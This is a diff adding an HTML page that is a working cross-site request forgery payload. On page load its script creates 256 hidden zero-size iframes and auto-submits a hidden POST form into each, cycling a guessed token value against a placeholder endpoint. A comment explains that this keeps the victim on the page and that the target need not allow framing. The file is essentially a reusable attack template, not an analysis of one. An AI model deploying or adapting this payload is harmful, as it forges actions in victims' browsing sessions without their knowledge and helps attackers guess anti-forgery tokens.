@@ -1,0 +1,44 @@
+<html>
+<body>
+<!-- multi-CSRF by keeping the user on-site by posting the CSRF request into an iframe; the vulnerable site doesn't have to be framable -->
+<script language="javascript">
+window.onload = function() {
+    for (let i = 0; i <= 255; i++) {
+        console.log("attempt: " + i);
+        // URL + POST keys/values + unique ID
+        createIframeForm("https://example.com/endpoint", { "somevalue": "0", "someOtherValue": "token" + i}, "test" + i);
+    }
+}
+
+function createIframeForm(action, inputs, id) {
+    iframeId = 'iframe' + id;
+    var iframe = document.createElement('iframe');
+    iframe.setAttribute('style', "display: hidden");
+    iframe.setAttribute('height', 0);
+    iframe.setAttribute('width', 0);
+    iframe.setAttribute('frameborder', 0);
+    iframe.setAttribute('name', iframeId);
+
+    var form = document.createElement('form');
+    form.setAttribute('method', 'post');
+    form.setAttribute('action', action);
+    form.setAttribute('id', id);
+    form.setAttribute('target', iframeId);
+
+    for (name in inputs) {
+        value = inputs[name];
+        var input = document.createElement('input');
+        input.setAttribute('name', name);
+        input.setAttribute('type', 'hidden');
+        input.setAttribute('value', value);
+        form.appendChild(input);
+    }
+
+    document.getElementsByTagName('body')[0].appendChild(iframe);
+    document.getElementsByTagName('body')[0].appendChild(form);
+
+    document.getElementById(id).submit();
+}
+</script>
+</body>
+</html>
